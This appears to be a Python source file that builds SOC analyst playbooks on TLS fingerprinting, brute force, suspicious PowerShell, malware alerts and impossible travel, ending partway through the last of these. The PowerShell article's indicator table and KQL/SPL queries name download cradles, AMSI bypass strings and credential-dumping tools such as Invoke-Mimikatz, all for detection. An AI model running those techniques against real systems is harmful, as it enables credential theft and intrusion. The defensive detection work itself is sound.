| Feature | JA3 | JA4 |
|---|---|---|
| TLS version | Included in hash | Explicit prefix character |
| QUIC support | Not supported | Supported with q prefix |
| SNI presence | Not included | Indicated with d/i prefix |
| ALPN values | Not included | Included in fingerprint |
| Cipher count | In hash only | Visible in fingerprint |
| Extension count | In hash only | Visible in fingerprint |
| Readability | Opaque MD5 hash | Human-readable structure |

JA4 format example: `t13d1516h2_8daaf6152771_b186095e22b6`
- t = TLS (not QUIC)
- 13 = TLS 1.3
- d = domain SNI present
- 15 = 15 ciphers
- 16 = 16 extensions
- h2 = HTTP/2 ALPN

## Expected Results

- Connections with JA3 fingerprints matching known C2 frameworks
- Rare JA3 fingerprints seen from very few hosts (custom or uncommon client)
- Self-signed certificates on external-facing TLS connections
- Certificates issued within the last 7 days (freshly provisioned C2 infrastructure)
- TLS connections without SNI (Server Name Indication) to external IPs
- Certificate subject/issuer mismatches with the SNI hostname
- Certificates with very long validity periods (10+ years) suggesting self-signed
- JA3S server fingerprints that change frequently for the same hostname

## Triage Steps

1. **Identify the JA3 fingerprint**: Look up the JA3 hash against known databases (ja3er.com, Abuse.ch JA3 feed).
2. **Examine the certificate**: Is it self-signed? What CA issued it? When was it created? Does the subject match the SNI?
3. **Identify the client process**: Use EDR to determine which process initiated the TLS connection.
4. **Check the destination**: Resolve the IP, check domain reputation, WHOIS age, and hosting provider.
5. **Analyze connection patterns**: Frequency, timing, and volume. Combine with beacon detection techniques.
6. **Compare against environment baseline**: Is this JA3 fingerprint seen from other hosts? Rare fingerprints warrant deeper investigation.
7. **Correlate with endpoint telemetry**: Match the network connection to process-level events on the source host.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Development and testing tools | curl, wget, Python requests have known JA3s; developer workstations |
| Internal self-signed services | Known internal IPs and hostnames; expected certificates |
| IoT and OT devices | Legacy TLS implementations; known device types |
| Let's Encrypt short-lived certs | 90-day validity; legitimate LE issuer |
| CDN and load balancer variance | Known CDN providers serving multiple JA3S for the same hostname |

## Building a JA3/JA4 Baseline

1. Collect JA3/JA4 fingerprints from all network sensors for 30 days
2. Map fingerprints to known applications (browsers, agents, tools)
3. Flag unknown or rare fingerprints for manual review
4. Create an allowlist of expected fingerprints per application
5. Alert on new fingerprints that appear after the baselining period

## References

- Salesforce: JA3 - TLS Client Fingerprinting
- FoxIO: JA4+ Network Fingerprinting
- Abuse.ch: JA3 Fingerprint Feed (SSLBL)
- Zeek: SSL/TLS Log Documentation
- Palo Alto: Decryption-Free TLS Threat Detection
"""
    ))

    return articles


"""
ION Knowledge Base - Alert Investigation Playbooks
16 detailed tactical playbook articles for SOC analyst alert triage and investigation.
Each article includes triage checklists, pivot queries (KQL/SPL), enrichment steps,
escalation criteria, documentation templates, and MITRE ATT&CK references.
"""


def alert_investigation_articles():
    """Return 16 alert investigation playbook articles for the SOC knowledge base."""
    return [
        # ---------------------------------------------------------------
        # Article 1: Brute Force / Password Spray
        # ---------------------------------------------------------------
        (
            "Investigating a Brute Force or Password Spray Alert",
            ["alert-investigation", "brute-force", "password-spray", "authentication", "credential-access"],
            r"""# Investigating a Brute Force or Password Spray Alert

## Alert Context

Brute force and password spray attacks target authentication endpoints to gain unauthorized access. A brute force attack tries many passwords against one account, while a password spray tries a small set of common passwords against many accounts. Both generate distinct telemetry patterns in authentication logs.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Windows Security Log | Event ID 4625 (Logon Failure), 4624 (Logon Success) | TargetUserName, IpAddress, LogonType, SubStatus |
| Azure AD / Entra ID | SignInLogs | UserPrincipalName, IPAddress, ResultType, Location |
| Linux | /var/log/auth.log, /var/log/secure | sshd, pam_unix, src IP |
| VPN / RADIUS | Vendor-specific | username, source_ip, auth_result |
| Web Application | WAF, app logs | endpoint, username, response_code |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Brute Force | T1110 | Credential Access |
| Password Spraying | T1110.003 | Credential Access |
| Valid Accounts | T1078 | Defense Evasion, Initial Access |

## Initial Triage Checklist

- [ ] Identify the authentication endpoint targeted (AD, VPN, O365, SSH, web app)
- [ ] Determine attack pattern: single-user brute force vs. multi-user spray
- [ ] Count total failed attempts and unique accounts targeted
- [ ] Identify source IP(s) and check for VPN, proxy, or Tor exit node
- [ ] Check for any successful authentication from the attacking source
- [ ] Review time window and rate of attempts
- [ ] Check if targeted accounts are privileged (admin, service accounts)
- [ ] Verify if any account lockouts were triggered
- [ ] Check geo-location of source IP against user baselines

## Pivot Queries

### KQL (Microsoft Sentinel / Azure Data Explorer)

```kql
// Failed logon attempts from a single source in the last 24 hours
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4625
| summarize FailCount = count(), DistinctAccounts = dcount(TargetUserName),
    Accounts = make_set(TargetUserName, 50) by IpAddress
| where FailCount > 20
| sort by FailCount desc

// Password spray detection: many accounts, few attempts per account
SecurityEvent
| where TimeGenerated > ago(4h)
| where EventID == 4625
| summarize AttemptsPerAccount = count() by TargetUserName, IpAddress
| summarize DistinctAccounts = dcount(TargetUserName),
    AvgAttemptsPerAccount = avg(AttemptsPerAccount) by IpAddress
| where DistinctAccounts > 10 and AvgAttemptsPerAccount < 5

// Check for successful logon from the same source IP after failures
let suspectIPs = SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4625
| summarize FailCount = count() by IpAddress
| where FailCount > 20
| project IpAddress;
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4624
| where IpAddress in (suspectIPs)
| project TimeGenerated, TargetUserName, IpAddress, LogonType

// Azure AD sign-in failures with error code breakdown
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType != "0"
| summarize FailCount = count(), Accounts = dcount(UserPrincipalName) by IPAddress, ResultType
| where FailCount > 30
| sort by FailCount desc
```

### SPL (Splunk)

```spl
// Windows brute force detection
index=wineventlog EventCode=4625
| stats count as fail_count dc(TargetUserName) as unique_accounts
    values(TargetUserName) as targeted_accounts by src_ip
| where fail_count > 20
| sort -fail_count

// Password spray: many users, low attempts per user
index=wineventlog EventCode=4625
| stats count as attempts by TargetUserName, src_ip
| stats dc(TargetUserName) as unique_users avg(attempts) as avg_per_user by src_ip
| where unique_users > 10 AND avg_per_user < 5

// Success after failure from same IP
index=wineventlog (EventCode=4625 OR EventCode=4624)
| eval status=if(EventCode=4625, "fail", "success")
| stats count(eval(status="fail")) as fails
    count(eval(status="success")) as successes
    values(TargetUserName) as accounts by src_ip
| where fails > 20 AND successes > 0

// O365 / Azure AD brute force
index=o365 sourcetype="o365:management:activity" Operation="UserLoginFailed"
| stats count as failures dc(UserId) as unique_users by ClientIP
| where failures > 30
```

## Enrichment Steps

1. **IP Reputation Check**
   - Query VirusTotal, AbuseIPDB, Shodan for the source IP
   - Check internal threat intel feeds and blocklists
   - Determine if IP belongs to a known VPN, proxy, cloud provider, or Tor exit node

2. **Geo-Location Analysis**
   - Map source IP to geographic location
   - Compare against the user's historical login locations
   - Flag if the IP originates from a sanctioned country or unusual region

3. **Account Context**
   - Is the targeted account active, disabled, or a service account?
   - Does the account have MFA enabled?
   - What privilege level does the account hold? (standard, admin, domain admin)
   - When was the password last changed?

4. **Historical Correlation**
   - Has this source IP appeared in previous incidents?
   - Have the targeted accounts been part of a known credential leak?
   - Check Have I Been Pwned or internal breach databases

5. **Network Context**
   - Is the source IP internal or external?
   - If internal, identify the host and check for compromise indicators
   - Review firewall and proxy logs for other activity from the same IP

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Failed attempts only, external IP, no success | Low | Block IP, monitor, close |
| Successful logon after spray from external IP | High | Escalate to Tier 2, force password reset |
| Privileged account targeted with success | Critical | Escalate to IR, disable account, contain host |
| Internal source IP performing spray | High | Investigate source host for compromise |
| Service account brute forced with success | Critical | Escalate to IR, rotate credentials, audit access |
| MFA bypass detected alongside spray | Critical | Escalate to IR, investigate MFA configuration |

## Documentation Template

```markdown
### Brute Force / Password Spray Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Summary:**
[Brief description of the alert and attack pattern observed]

**Source IP(s):** [IP ADDRESS(ES)]
**Targeted Account(s):** [ACCOUNT LIST]
**Authentication Endpoint:** [AD / Azure AD / VPN / SSH / Web App]

**Attack Pattern:**
- Type: [ ] Brute Force  [ ] Password Spray
- Total failed attempts: [COUNT]
- Unique accounts targeted: [COUNT]
- Time window: [START] to [END]
- Any successful logon: [YES/NO]

**Enrichment Findings:**
- IP reputation: [CLEAN / MALICIOUS / SUSPICIOUS]
- IP geolocation: [COUNTRY, CITY]
- IP owner: [ISP / CLOUD PROVIDER / TOR]
- Account MFA status: [ENABLED / DISABLED]
- Account privilege level: [STANDARD / ADMIN]

**Actions Taken:**
- [ ] Blocked source IP at firewall/WAF
- [ ] Forced password reset for compromised account(s)
- [ ] Enabled/verified MFA on targeted accounts
- [ ] Notified account owner(s)
- [ ] Checked for post-compromise activity

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO — to whom]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Block attacking IP(s) at perimeter firewall or WAF
2. **If compromised**: Force password reset, revoke active sessions, review MFA enrollment
3. **Containment**: If internal source, isolate the host for investigation
4. **Recovery**: Audit all logon activity from compromised account in past 30 days
5. **Hardening**: Implement account lockout policy, deploy MFA, add IP-based conditional access
""",
        ),
        # ---------------------------------------------------------------
        # Article 2: Suspicious PowerShell Execution
        # ---------------------------------------------------------------
        (
            "Investigating a Suspicious PowerShell Execution Alert",
            ["alert-investigation", "powershell", "execution", "living-off-the-land", "defense-evasion"],
            r"""# Investigating a Suspicious PowerShell Execution Alert

## Alert Context

PowerShell is the most commonly abused living-off-the-land binary (LOLBin) in modern attacks. Adversaries leverage it for downloading payloads, executing fileless malware, credential harvesting, lateral movement, and data exfiltration. Suspicious PowerShell alerts fire on encoded commands, obfuscation, download cradles, AMSI bypass attempts, and anomalous execution patterns.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| PowerShell Script Block Logging | Event ID 4104 | ScriptBlockText, ScriptBlockId, Path |
| PowerShell Module Logging | Event ID 4103 | CommandInvocation, ParameterBinding |
| PowerShell Engine Start/Stop | Event IDs 400, 403, 600 | HostName, HostVersion, EngineVersion |
| Sysmon Process Create | Event ID 1 | CommandLine, ParentImage, User, Hashes |
| Sysmon Network Connect | Event ID 3 | DestinationIp, DestinationPort, Image |
| Windows Defender / AMSI | Event ID 1116 | ThreatName, SeverityName, Path |
| EDR Telemetry | Vendor-specific | process_tree, command_line, file_writes |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| PowerShell | T1059.001 | Execution |
| Obfuscated Files or Information | T1027 | Defense Evasion |
| Ingress Tool Transfer | T1105 | Command and Control |
| OS Credential Dumping | T1003 | Credential Access |

## Initial Triage Checklist

- [ ] Read the full decoded command line (decode base64 if -EncodedCommand was used)
- [ ] Identify the parent process (what spawned PowerShell?)
- [ ] Determine the user context (SYSTEM, service account, or interactive user?)
- [ ] Check if the host is a workstation, server, or domain controller
- [ ] Look for known malicious patterns: download cradles, AMSI bypass, encoded IEX
- [ ] Check if the script was loaded from a file path or invoked inline
- [ ] Review subsequent process and network activity from the same host
- [ ] Verify if this is a known IT/admin script or automation

## Suspicious Indicators

Watch for these patterns in the command line or script block text:

| Pattern | Indicator |
|---------|-----------|
| `-EncodedCommand` / `-enc` | Base64 encoded payload |
| `IEX`, `Invoke-Expression` | Dynamic code execution |
| `Net.WebClient`, `DownloadString`, `DownloadFile` | Download cradle |
| `Invoke-Mimikatz`, `DumpCreds` | Credential theft tools |
| `[Ref].Assembly.GetType`, `AmsiUtils` | AMSI bypass attempt |
| `-WindowStyle Hidden`, `-NonInteractive` | Stealth execution flags |
| `Start-Process`, `Invoke-WMIMethod` | Process spawning / lateral movement |
| `ConvertTo-SecureString`, `PSCredential` | Credential manipulation |
| Random variable names, backtick obfuscation | Evasion / obfuscation |
| `Set-MpPreference -DisableRealtimeMonitoring` | Defender tampering |

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// PowerShell with encoded command in the last 24 hours
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4688
| where NewProcessName endswith "powershell.exe" or NewProcessName endswith "pwsh.exe"
| where CommandLine contains_cs "-enc" or CommandLine contains_cs "-EncodedCommand"
    or CommandLine contains_cs "FromBase64String"
| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName

// Script block logging - suspicious content
Event
| where TimeGenerated > ago(24h)
| where EventID == 4104
| where RenderedDescription has_any (
    "Invoke-Expression", "IEX", "DownloadString", "Net.WebClient",
    "Invoke-Mimikatz", "AmsiUtils", "Reflection.Assembly",
    "DumpCreds", "SecureString", "DisableRealtimeMonitoring")
| project TimeGenerated, Computer, RenderedDescription

// PowerShell making network connections (Sysmon)
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 3
| where Image endswith "powershell.exe" or Image endswith "pwsh.exe"
| summarize ConnectionCount = count(), DestIPs = make_set(DestinationIp, 20)
    by Computer, User
| where ConnectionCount > 3

// Parent process analysis for PowerShell spawning
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 1
| where Image endswith "powershell.exe" or Image endswith "pwsh.exe"
| summarize count() by ParentImage
| sort by count_ desc
```

### SPL (Splunk)

```spl
// Encoded PowerShell commands
index=wineventlog (EventCode=4688 OR EventCode=1)
    (NewProcessName="*powershell*" OR Image="*powershell*")
    (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"
     OR CommandLine="*FromBase64String*")
| table _time host user CommandLine ParentImage

// Script block logging for suspicious keywords
index=wineventlog EventCode=4104
| search ScriptBlockText="*Invoke-Expression*" OR ScriptBlockText="*DownloadString*"
    OR ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*Invoke-Mimikatz*"
    OR ScriptBlockText="*AmsiUtils*"
| table _time host ScriptBlockText

// PowerShell network connections via Sysmon
index=sysmon EventCode=3 Image="*powershell*"
| stats count dc(DestinationIp) as unique_dests values(DestinationIp) as dest_ips
    by Computer, User
| where count > 3

// Unusual parent processes spawning PowerShell
index=sysmon EventCode=1 Image="*powershell*"
| stats count by ParentImage
| sort -count
```

## Enrichment Steps

1. **Decode the Payload**
   - Base64 decode any `-EncodedCommand` parameter
   - Deobfuscate backtick insertion, string concatenation, and variable substitution
   - Use CyberChef or PowerDecode for multi-layer decoding

2. **Analyze the Script Logic**
   - Identify what the script does: download, execute, exfiltrate, persist?
   - Extract IOCs: URLs, IP addresses, file hashes, registry keys, file paths
   - Check for credential access (Mimikatz patterns, LSA secrets, SAM dumps)

3. **Process Tree Context**
   - Map the full process tree: grandparent -> parent -> powershell -> children
   - Flag unusual parents: winword.exe, excel.exe, outlook.exe, wscript.exe, mshta.exe
   - Check for child processes spawned by PowerShell (cmd, certutil, bitsadmin)

4. **Network Activity**
   - Review outbound connections made by the PowerShell process
   - Check destination IPs/domains against threat intel feeds
   - Look for data exfiltration patterns (large uploads, DNS tunneling)

5. **File System Impact**
   - Check for files written to disk by PowerShell
   - Look for dropped executables in Temp, AppData, ProgramData
   - Review scheduled tasks or registry modifications for persistence

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Known admin/IT script, expected behavior | Info | Whitelist, close |
| Encoded command from user workstation, no clear malice | Medium | Investigate, contact user |
| Download cradle or AMSI bypass detected | High | Escalate, isolate host |
| Credential dumping (Mimikatz, LSA) detected | Critical | Escalate to IR, contain host |
| PowerShell spawned by Office macro | Critical | Escalate to IR, contain host, check email source |
| Lateral movement commands (Invoke-Command, Enter-PSSession to other hosts) | Critical | Escalate to IR, assess blast radius |

## Documentation Template

```markdown
### Suspicious PowerShell Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Host:** [HOSTNAME]
**User:** [DOMAIN\USERNAME]
**Process:** [powershell.exe / pwsh.exe] PID: [PID]
**Parent Process:** [PARENT_IMAGE] PID: [PARENT_PID]

**Command Summary:**
[Decoded, deobfuscated description of what the command does]

**Raw Command Line:**
[FULL COMMAND LINE]

**Decoded Payload (if encoded):**
[DECODED CONTENT]

**IOCs Extracted:**
- URLs: [LIST]
- IPs: [LIST]
- File hashes: [LIST]
- File paths: [LIST]

**Network Activity:**
- Outbound connections: [DEST_IP:PORT list]
- Data transferred: [BYTES]

**Actions Taken:**
- [ ] Decoded and analyzed full payload
- [ ] Reviewed process tree
- [ ] Checked network connections
- [ ] Scanned host with EDR
- [ ] Isolated host (if warranted)
- [ ] Submitted IOCs to threat intel platform

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Isolate the host via EDR if active compromise is confirmed
2. **Analyze**: Decode payload fully before making containment decisions
3. **Contain**: Block extracted C2 domains/IPs at proxy and firewall
4. **Eradicate**: Remove persistence mechanisms, kill malicious processes
5. **Harden**: Enable Constrained Language Mode, deploy AppLocker/WDAC policies, ensure Script Block Logging is on everywhere
""",
        ),
        # ---------------------------------------------------------------
        # Article 3: Malware Detection (EDR/AV)
        # ---------------------------------------------------------------
        (
            "Investigating a Malware Detection Alert (EDR/AV)",
            ["alert-investigation", "malware", "edr", "antivirus", "endpoint-security"],
            r"""# Investigating a Malware Detection Alert (EDR/AV)

## Alert Context

Malware detection alerts fire when endpoint protection (AV/EDR) identifies a malicious file, process, or behavior. These alerts range from commodity adware to targeted implants. The investigation goal is to determine: Was the malware blocked or did it execute? How did it arrive? Has it spread? Is there post-compromise activity?

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Windows Defender | Event IDs 1116, 1117, 1118 | ThreatName, SeverityName, Path, Action |
| EDR (CrowdStrike, SentinelOne, Defender for Endpoint) | Vendor console / API | detection_name, severity, sha256, file_path, process_tree |
| Sysmon | Event IDs 1, 7, 11, 15 | Image, Hashes, TargetFilename, FileVersion |
| VirusTotal / Sandbox | External API | detection_ratio, sandbox_behavior, contacted_hosts |
| Email Gateway | Message trace / quarantine | sender, subject, attachment_hash, URL |
| Proxy / Web Filter | URL logs | requested_url, user_agent, response_code |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| User Execution | T1204 | Execution |
| Ingress Tool Transfer | T1105 | Command and Control |
| Masquerading | T1036 | Defense Evasion |
| Boot or Logon Autostart Execution | T1547 | Persistence |
| Application Layer Protocol | T1071 | Command and Control |

## Initial Triage Checklist

- [ ] Note the detection name, severity, and action taken (blocked, quarantined, allowed)
- [ ] Record the file hash (SHA256), file path, and file name
- [ ] Identify the affected host and logged-in user
- [ ] Determine how the file arrived (email attachment, web download, USB, lateral movement)
- [ ] Check if the malware executed or was caught pre-execution
- [ ] Look up the hash on VirusTotal and check sandbox reports
- [ ] Review the process tree if the malware executed
- [ ] Check for persistence mechanisms installed
- [ ] Scan for the same hash across all endpoints

## Pivot Queries

### KQL (Microsoft Sentinel / Defender for Endpoint)

```kql
// Find all detections for a specific file hash across the fleet
DeviceAlertEvents
| where TimeGenerated > ago(7d)
| where SHA256 == "<HASH_VALUE>"
| project TimeGenerated, DeviceName, FileName, FolderPath, AlertSeverity, ActionType

// Endpoints with the file present (not necessarily detected)
DeviceFileEvents
| where TimeGenerated > ago(7d)
| where SHA256 == "<HASH_VALUE>"
| project TimeGenerated, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessFileName

// Process execution from the malware file path
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FolderPath contains "<SUSPICIOUS_PATH>"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, AccountName

// Network connections from the affected host post-detection
DeviceNetworkEvents
| where TimeGenerated > ago(24h)
| where DeviceName == "<AFFECTED_HOST>"
| where RemoteIPType == "Public"
| summarize ConnectionCount = count(), Ports = make_set(RemotePort)
    by RemoteIP, RemoteUrl
| sort by ConnectionCount desc

// Check if the malware was delivered via email
EmailAttachmentInfo
| where TimeGenerated > ago(7d)
| where SHA256 == "<HASH_VALUE>"
| join kind=inner EmailEvents on NetworkMessageId
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject, FileName
```

### SPL (Splunk)

```spl
// Search for malware hash across all endpoint logs
index=edr sha256="<HASH_VALUE>"
| table _time host user file_path detection_name action severity

// Process tree from affected host
index=sysmon EventCode=1 Computer="<AFFECTED_HOST>"
| eval process_chain=ParentImage." -> ".Image
| table _time User process_chain CommandLine Hashes

// File creation events for the malicious file
index=sysmon EventCode=11 TargetFilename="*<FILENAME>*"
| table _time Computer Image TargetFilename

// Network connections from the affected host
index=sysmon EventCode=3 Computer="<AFFECTED_HOST>"
| where NOT cidrmatch("10.0.0.0/8", DestinationIp)
    AND NOT cidrmatch("172.16.0.0/12", DestinationIp)
    AND NOT cidrmatch("192.168.0.0/16", DestinationIp)
| stats count values(DestinationPort) as ports by DestinationIp Image
| sort -count

// Lateral spread check: same hash on other hosts
index=edr (sha256="<HASH_VALUE>" OR file_hash="<HASH_VALUE>")
| stats count by host
| sort -count
```

## Enrichment Steps

1. **Hash Analysis**
   - Submit SHA256 to VirusTotal: check detection ratio, first/last seen dates
   - Review sandbox reports (ANY.RUN, Hybrid Analysis, Joe Sandbox)
   - Check internal malware repository for previous encounters
   - Classify malware family: ransomware, RAT, trojan, worm, PUP, coinminer

2. **Delivery Vector Investigation**
   - Check email gateway for attachment matching the hash
   - Review proxy/web logs for download URL
   - Check USB device insertion logs if no network delivery found
   - Look for parent process indicators (Office, browser, script interpreter)

3. **Execution Analysis**
   - Review the full process tree: did the malware spawn child processes?
   - Check for: cmd.exe, powershell.exe, wscript.exe, cscript.exe children
   - Review registry modifications (Run keys, services, scheduled tasks)
   - Check for dropped files in Temp, AppData, ProgramData

4. **Network IOC Extraction**
   - Extract C2 server IPs and domains from sandbox reports
   - Search proxy and firewall logs for connections to extracted C2 IOCs
   - Check DNS logs for resolution of suspicious domains

5. **Scope Assessment**
   - Search for the same hash across all endpoints
   - Check if the delivery email was sent to multiple recipients
   - Identify any accounts that may have been compromised during execution

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Known PUP/adware, blocked pre-execution | Low | Remove, close |
| Commodity malware, blocked but email delivered to others | Medium | Remove from all inboxes, scan other recipients |
| Malware executed, no C2 connections observed | High | Isolate host, deep scan, escalate to Tier 2 |
| Malware executed with active C2 communication | Critical | Escalate to IR, isolate host, block C2 |
| Ransomware identified (any stage) | Critical | Escalate to IR, activate ransomware playbook |
| Targeted/APT malware family identified | Critical | Escalate to IR, executive notification |

## Documentation Template

```markdown
### Malware Detection Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Detection Details:**
- Detection name: [MALWARE_NAME]
- Severity: [LOW/MEDIUM/HIGH/CRITICAL]
- Action taken by AV/EDR: [BLOCKED/QUARANTINED/ALLOWED]
- File name: [FILENAME]
- File path: [FULL_PATH]
- SHA256: [HASH]
- File size: [SIZE]

**Affected Endpoint:**
- Hostname: [HOSTNAME]
- IP: [IP_ADDRESS]
- User: [USERNAME]
- OS: [WINDOWS 10/11, SERVER 2019, etc.]

**Delivery Vector:** [Email / Web Download / USB / Lateral Movement / Unknown]
**Delivery Details:** [Email subject, URL, source host, etc.]

**Execution Status:**
- Did the malware execute? [YES/NO]
- Process tree: [PARENT -> MALWARE -> CHILDREN]
- Persistence installed: [YES/NO — details]
- C2 communication observed: [YES/NO — IPs/domains]

**Scope:**
- Other endpoints with same hash: [COUNT — HOSTNAMES]
- Other users who received delivery email: [COUNT — USERNAMES]

**IOCs:**
| Type | Value | Context |
|------|-------|---------|
| SHA256 | [HASH] | Malware binary |
| Domain | [DOMAIN] | C2 server |
| IP | [IP] | C2 server |
| URL | [URL] | Delivery URL |

**Actions Taken:**
- [ ] Quarantined/removed malware from affected host(s)
- [ ] Isolated affected host(s) via EDR
- [ ] Blocked C2 IOCs at firewall/proxy
- [ ] Removed delivery email from all mailboxes
- [ ] Scanned all endpoints for the same hash
- [ ] Submitted sample to sandbox for analysis
- [ ] Updated threat intel platform with IOCs

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: If executed, isolate the host via EDR network containment
2. **Scope**: Search for the hash across all endpoints and email inboxes
3. **Block**: Add C2 IOCs to firewall, proxy, and DNS blocklists
4. **Eradicate**: Remove malware, persistence, and dropped artifacts from all affected hosts
5. **Recover**: Reimage if rootkit/bootkit suspected; restore from backup if data corrupted
6. **Report**: Submit sample to AV vendor and update detection signatures
""",
        ),
        # ---------------------------------------------------------------
        # Article 4: Impossible Travel / Geo-Anomaly
        # ---------------------------------------------------------------
        (
            "Investigating an Impossible Travel or Geo-Anomaly Alert",
            ["alert-investigation", "impossible-travel", "geo-anomaly", "identity", "account-compromise"],
            r"""# Investigating an Impossible Travel or Geo-Anomaly Alert

## Alert Context

Impossible travel alerts fire when a user authenticates from two geographically distant locations within a timeframe that makes physical travel impossible. Geo-anomaly alerts trigger on logins from unusual countries or regions for a given user. These alerts are strong indicators of credential compromise, token theft, or VPN/proxy abuse.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Azure AD / Entra ID Sign-In Logs | SigninLogs | UserPrincipalName, IPAddress, Location, DeviceDetail, ConditionalAccessStatus |
| Azure AD Identity Protection | SecurityAlert | AlertType, CompromisedEntity, DetectionTimingType |
| Okta System Log | okta.systemlog | actor.alternateId, client.ipAddress, client.geographicalContext |
| VPN/RADIUS Logs | Vendor-specific | username, source_ip, geo_location |
| Cloud Provider Logs | CloudTrail, Activity Log | userIdentity, sourceIPAddress, awsRegion |
| On-prem AD | Event IDs 4624, 4625 | TargetUserName, IpAddress |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Valid Accounts: Cloud Accounts | T1078.004 | Defense Evasion, Initial Access |
| Steal Web Session Cookie | T1539 | Credential Access |
| Steal Application Access Token | T1528 | Credential Access |
| Use Alternate Authentication Material | T1550 | Defense Evasion, Lateral Movement |

## Initial Triage Checklist

- [ ] Identify both login locations, timestamps, and calculated travel speed
- [ ] Check if either IP is a known VPN, proxy, or cloud provider
- [ ] Determine the authentication method (password, MFA, SSO token, certificate)
- [ ] Check if the user has legitimate reasons for multi-geo access (travel, VPN usage)
- [ ] Review the device details for both sessions (OS, browser, device ID)
- [ ] Check conditional access policy results for both logins
- [ ] Look for password changes, MFA changes, or app consent grants near the login times
- [ ] Determine if the user's account appears in recent phishing campaigns

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// Full sign-in history for the user in the last 7 days
SigninLogs
| where TimeGenerated > ago(7d)
| where UserPrincipalName == "<USER_UPN>"
| project TimeGenerated, IPAddress, Location, DeviceDetail, AppDisplayName,
    ResultType, ConditionalAccessStatus, AuthenticationRequirement
| sort by TimeGenerated desc

// Geo-mapping of all IPs used by the user
SigninLogs
| where TimeGenerated > ago(30d)
| where UserPrincipalName == "<USER_UPN>"
| extend City = tostring(LocationDetails.city),
    Country = tostring(LocationDetails.countryOrRegion),
    State = tostring(LocationDetails.state)
| summarize LoginCount = count(), FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated) by IPAddress, City, Country, State
| sort by LoginCount desc

// Check for suspicious activity post-login from anomalous IP
let anomalousIP = "<SUSPICIOUS_IP>";
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(7d)
| where IPAddress == anomalousIP
| project TimeGenerated, UserPrincipalName, AppDisplayName, ResourceDisplayName,
    ResultType, Location

// MFA registration or modification events for the user
AuditLogs
| where TimeGenerated > ago(7d)
| where TargetResources has "<USER_UPN>"
| where OperationName has_any ("MFA", "authentication method", "strong authentication")
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, Result

// Inbox rule changes (BEC indicator)
OfficeActivity
| where TimeGenerated > ago(7d)
| where UserId == "<USER_UPN>"
| where Operation in ("New-InboxRule", "Set-InboxRule", "UpdateInboxRules")
| project TimeGenerated, Operation, Parameters
```

### SPL (Splunk)

```spl
// User sign-in history with geo data
index=azure_ad sourcetype="azure:aad:signin" userPrincipalName="<USER_UPN>"
| iplocation src_ip
| table _time src_ip City Country app_name result_type auth_requirement
| sort -_time

// Compare login locations within time windows
index=azure_ad sourcetype="azure:aad:signin" userPrincipalName="<USER_UPN>"
| iplocation src_ip
| streamstats current=f window=1 last(_time) as prev_time last(City) as prev_city
    last(Country) as prev_country last(src_ip) as prev_ip
| eval time_diff_hours=round((_time - prev_time)/3600, 2)
| where isnotnull(prev_city) AND City!=prev_city
| table _time src_ip City Country prev_time prev_ip prev_city prev_country time_diff_hours

// Post-compromise activity from suspicious IP
index=azure_ad src_ip="<SUSPICIOUS_IP>"
| stats count values(userPrincipalName) as users values(app_name) as apps by src_ip
| sort -count

// MFA change events
index=azure_ad sourcetype="azure:aad:audit"
| search targetResources="*<USER_UPN>*"
    (operationName="*MFA*" OR operationName="*authentication method*")
| table _time operationName initiatedBy targetResources result
```

## Enrichment Steps

1. **IP Intelligence**
   - Look up both IPs on AbuseIPDB, VirusTotal, Shodan
   - Determine if the anomalous IP belongs to a VPN service (NordVPN, ExpressVPN, etc.)
   - Check if the IP is a known cloud provider or hosting service
   - Verify ASN ownership to identify commercial VPN or bulletproof hosting

2. **User Context**
   - Contact the user (via verified channel, not the potentially compromised account)
   - Ask: Are you traveling? Do you use a VPN? Did you share credentials?
